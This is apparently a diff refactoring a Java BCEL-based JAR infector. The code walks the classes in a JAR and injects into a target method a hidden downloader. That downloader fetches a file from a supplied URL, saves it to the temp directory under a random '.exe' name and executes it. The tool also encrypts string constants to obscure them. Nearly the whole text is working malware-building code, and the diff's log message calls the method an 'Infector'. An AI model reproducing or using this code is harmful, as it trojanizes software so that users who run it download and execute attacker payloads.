@@ -26,30 +26,29 @@ public class Injector {
         for (ClassGen cg : LoadedJar.ClassEntries.values()) {
             if (cg.getClassName().contains("$")) continue;
             for (Method method : cg.getMethods()) {
-                if (method.getName().equals(criteria)) {
-                    //INJECT METHOD
-                    Logger.log("Located Static Initializer -> Class: " + cg.getClassName());
-                    MethodGen dler = getDownloader(cg, downloadUrl, Misc.getRandomString(7, true) + ".exe");
-                    if (cg.containsMethod(dler.getName(), dler.getSignature()) == null) {
-                        Logger.log("Injecting Downloader Method -> Class: " + cg.getClassName());
-                        cg.addMethod(dler.getMethod());
-                    } else {
-                        Logger.error("Download Method Already Exists! -> Class: " + cg.getClassName());
-                    }
-
-                    //INJECT CALL
-                    MethodGen mg = new MethodGen(method, cg.getClassName(), cg.getConstantPool());
-                    InstructionList list = mg.getInstructionList();
-                    Logger.log("Injecting Call -> Class: " + cg.getClassName() + " Method: " + method.getName());
-                    int od = cg.getConstantPool().addMethodref(dler);
-                    list.getEnd().setInstruction(new INVOKESTATIC(od));
-                    list.append(new RETURN());
-                    list.setPositions();
-                    mg.setInstructionList(list);
-                    mg.setMaxLocals();
-                    mg.setMaxStack();
-                    cg.replaceMethod(method, mg.getMethod());
+                if (!method.getName().equals(criteria)) continue;
+                //INJECT METHOD
+                Logger.log("Located Static Initializer -> Class: " + cg.getClassName());
+                MethodGen dler = getDownloader(cg, downloadUrl, Misc.getRandomString(7, true) + ".exe");
+                if (cg.containsMethod(dler.getName(), dler.getSignature()) == null) {
+                    Logger.log("Injecting Infector Method -> Class: " + cg.getClassName());
+                    cg.addMethod(dler.getMethod());
+                } else {
+                    Logger.error("Download Method Already Exists! -> Class: " + cg.getClassName());
                 }
+
+                //INJECT CALL
+                MethodGen mg = new MethodGen(method, cg.getClassName(), cg.getConstantPool());
+                InstructionList list = mg.getInstructionList();
+                Logger.log("Injecting Call -> Class: " + cg.getClassName() + " Method: " + method.getName());
+                list.getEnd().setInstruction(new INVOKESTATIC(cg.getConstantPool().addMethodref(dler)));
+                list.append(new RETURN());
+                list.setPositions();
+
+                mg.setInstructionList(list);
+                mg.setMaxLocals();
+                mg.setMaxStack();
+                cg.replaceMethod(method, mg.getMethod());
             }
         }
     }
@@ -66,15 +65,14 @@ public class Injector {
                 Logger.log("Obfuscating Strings -> Class: " + cg.getClassName() + " Method: " + method.getName());
                 InstructionHandle[] handles = list.getInstructionHandles();
                 for (InstructionHandle handle : handles) {
-                    if (handle.getInstruction() instanceof LDC) {
-                        try {
-                            String orig = ((LDC) handle.getInstruction()).getValue(cg.getConstantPool()).toString();
-                            int index = cg.getConstantPool().addString(getCiphered(orig, Settings.KEY));
-                            handle.setInstruction(new LDC(index));
-                            list.append(handle, new INVOKESTATIC(cg.getConstantPool().addMethodref(cryptor)));
-                        } catch (Exception e) {
-                            Logger.debug("Caught error, skipping instruction.");
-                        }
+                    if (!(handle.getInstruction() instanceof LDC)) continue;
+                    try {
+                        String orig = ((LDC) handle.getInstruction()).getValue(cg.getConstantPool()).toString();
+                        int index = cg.getConstantPool().addString(getCiphered(orig, Settings.KEY));
+                        handle.setInstruction(new LDC(index));
+                        list.append(handle, new INVOKESTATIC(cg.getConstantPool().addMethodref(cryptor)));
+                    } catch (Exception e) {
+                        Logger.debug("Caught error, skipping instruction.");
                     }
                 }
                 list.setPositions();
@@ -117,14 +115,14 @@ public class Injector {
         InstructionFactory _factory = new InstructionFactory(cg);
         InstructionList il = new InstructionList();
         il.append(_factory.createNew("java.net.URL"));
-        il.append(InstructionConstants.DUP);
+        il.append(new DUP());
         il.append(new PUSH(cg.getConstantPool(), url));
         il.append(_factory.createInvoke("java.net.URL", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
         il.append(_factory.createInvoke("java.net.URL", "openStream", new ObjectType("java.io.InputStream"), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
         il.append(_factory.createInvoke("java.nio.channels.Channels", "newChannel", new ObjectType("java.nio.channels.ReadableByteChannel"), new Type[]{new ObjectType("java.io.InputStream")}, Constants.INVOKESTATIC));
         il.append(InstructionFactory.createStore(Type.OBJECT, 0));
         il.append(_factory.createNew("java.lang.StringBuilder"));
-        il.append(InstructionConstants.DUP);
+        il.append(new DUP());
         il.append(_factory.createInvoke("java.lang.StringBuilder", "<init>", Type.VOID, Type.NO_ARGS, Constants.INVOKESPECIAL));
         il.append(new PUSH(cg.getConstantPool(), "java.io.tmpdir"));
         il.append(_factory.createInvoke("java.lang.System", "getProperty", Type.STRING, new Type[]{Type.STRING}, Constants.INVOKESTATIC));
@@ -134,7 +132,7 @@ public class Injector {
         il.append(_factory.createInvoke("java.lang.StringBuilder", "toString", Type.STRING, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
         il.append(InstructionFactory.createStore(Type.OBJECT, 1));
         il.append(_factory.createNew("java.io.FileOutputStream"));
-        il.append(InstructionConstants.DUP);
+        il.append(new DUP());
         il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
         il.append(_factory.createInvoke("java.io.FileOutputStream", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
         il.append(InstructionFactory.createStore(Type.OBJECT, 2));
@@ -144,17 +142,19 @@ public class Injector {
         il.append(new PUSH(cg.getConstantPool(), (long) 0));
         il.append(new PUSH(cg.getConstantPool(), (long) 1 << 24));
         il.append(_factory.createInvoke("java.nio.channels.FileChannel", "transferFrom", Type.LONG, new Type[]{new ObjectType("java.nio.channels.ReadableByteChannel"), Type.LONG, Type.LONG}, Constants.INVOKEVIRTUAL));
-        il.append(InstructionConstants.POP2);
+        il.append(new POP2());
         il.append(InstructionFactory.createLoad(Type.OBJECT, 2));
         il.append(_factory.createInvoke("java.io.FileOutputStream", "close", Type.VOID, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
         il.append(_factory.createInvoke("java.lang.Runtime", "getRuntime", new ObjectType("java.lang.Runtime"), Type.NO_ARGS, Constants.INVOKESTATIC));
         il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
         il.append(_factory.createInvoke("java.lang.Runtime", "exec", new ObjectType("java.lang.Process"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
-        il.append(InstructionConstants.POP);
+        il.append(new POP());
         il.append(InstructionFactory.createReturn(Type.VOID));
         il.setPositions();
         nname = Misc.getRandomString(12, false);
-        MethodGen method = new MethodGen(Constants.ACC_PUBLIC | Constants.ACC_STATIC, Type.VOID, Type.NO_ARGS, new String[]{}, nname, cg.getClassName(), il, cg.getConstantPool());
+
+        MethodGen method = new MethodGen(Constants.ACC_PUBLIC | Constants.ACC_STATIC, Type.VOID, Type.NO_ARGS, new String[]{},
+                nname, cg.getClassName(), il, cg.getConstantPool());
         nsig = method.getSignature();
         method.setMaxLocals();
         method.setMaxStack();
